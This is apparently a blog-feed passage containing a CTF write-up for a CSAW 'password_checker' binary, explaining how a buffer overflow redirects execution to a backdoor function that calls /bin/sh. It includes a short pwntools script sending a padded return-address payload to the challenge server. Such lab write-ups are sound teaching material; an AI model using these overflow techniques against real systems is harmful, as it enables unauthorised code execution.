+<p>This means we can try and do bufferoverflow meaning we will try to put more data into a fixed-lenght buffer than the buffer can handle and thereby be able to do code execution by shellcode injection.</p>
+<p>So I used a reverse engineering tool called Cutter to decompile the binary file to get some information we are gonna use in the buffer overflow.</p>
+<p>Here I find a backdoor which looks like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">backdoor</span>(<span style="color:#66d9ef">void</span>)
+{
+    system(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
+    <span style="color:#66d9ef">return</span>;
+}
+</code></pre></div><p>We can then use cutter to get the instruction address which in this case is 0x0040117d, we can then use pwn tools to process our binary file and send our specific line which we specify to overflow. Then we can specify the address for the information which we want usinger pointers in order to be able to connect via netcat.</p>
+<p>once we have perfected the bufferoverflow we can try and edit our script to execute the remote on the netcat server which is listening for the password.</p>
+<p>Then if everything was done correctly you can type whoami and then you will be able to see nobody which tells you who you are you can then try typing ls to see what are in the directory, and there you will find the flag.txt, you can then cat the txt file to get the flag.</p>
+<h3 id="python-script-used">Python Script used:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#pip install pwn</span>
+<span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./password_checker&#34;</span>)
+<span style="color:#75715e">#doesn&#39;t need to run remote before we have perfected the bufferoverflow</span>
+p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;pwn.chal.csaw.io&#39;</span>,<span style="color:#ae81ff">5000</span>)
+p<span style="color:#f92672">.</span>sendline (<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">72</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x84\x11\x40\x00\x00\x00\x00\x00\x72\x11\x40\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#39;</span>)
+p<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h1 id="tools-used">Tools used</h1>
+<h4 id="gdb">GDB</h4>
+<p>Gnu project debugger <a href="https://www.gnu.org/software/gdb/">https://www.gnu.org/software/gdb/</a></p>
+<h4 id="checksec">Checksec</h4>
+<p>checksec is a bash script to check the properties of executables (like PIE, RELRO, PaX, Canaries, ASLR, Fortify Source) <a href="https://github.com/slimm609/checksec.sh">https://github.com/slimm609/checksec.sh</a></p>
+<h4 id="cutter">cutter</h4>
+<p><a href="http://cutter.re">http://cutter.re</a> is a free open source RE platform, used to convert assembly into something that looks like C</p>
+<p>pwn is a gdb wrapper <a href="https://github.com/Gallopsled/pwntools">https://github.com/Gallopsled/pwntools</a></p>
+]]></content>
         </item>
         
     </channel>
